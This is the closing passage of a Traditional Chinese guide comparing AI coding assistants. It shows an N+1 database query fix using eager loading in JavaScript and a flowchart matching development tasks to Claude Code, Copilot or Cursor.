  return orders;
}
// 如果有 100 個訂單 → 101 次查詢！
```

優化方案：
```javascript
// ✓ 使用 JOIN 或 eager loading
async function getOrdersWithUsers() {
  const orders = await Order.findAll({
    include: [User]  // 1 query with JOIN
  });
  return orders;
}
// 只需 1 次查詢！
```

效能提升：3000ms → 50ms（60x faster）

..."
```

---

## 總結：情境決策快速參考

```
快速決策流程圖：

任務類型判斷：
├─ 架構設計、技術選型 → [Claude Code]
├─ CRUD 開發、測試撰寫 → [Copilot]
├─ 快速原型、中型專案 → [Cursor]
├─ 大型重構、複雜 Bug → [Claude Code]
├─ 學習新技術 → [Claude Code] 然後切換到 [Copilot]
├─ 安全審計、效能優化 → [Claude Code (Specialized Agent)]
└─ 代碼遷移、批量修改 → [Cursor]

記憶口訣：
"深度選 Claude，速度選 Copilot，平衡選 Cursor"
```

---

**檔案資訊**
- 字數：~8,500 字
- 閱讀時間：20 分鐘
- 場景數：8 個
- 最後更新：2025-10-30
